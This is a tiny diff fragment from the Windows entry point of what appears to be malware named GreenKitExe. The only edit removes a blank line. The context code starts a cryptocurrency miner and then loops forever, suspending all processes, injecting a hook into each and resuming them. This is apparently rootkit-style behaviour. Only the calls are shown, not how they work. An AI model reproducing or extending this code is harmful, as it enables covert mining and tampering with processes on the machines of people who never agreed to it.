@@ -33,7 +33,6 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	MessageBoxA(NULL, "GreenKitExe Is ALIVE !!!!", NULL, NULL);
 
     StartMiner();
-
 	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(1000);
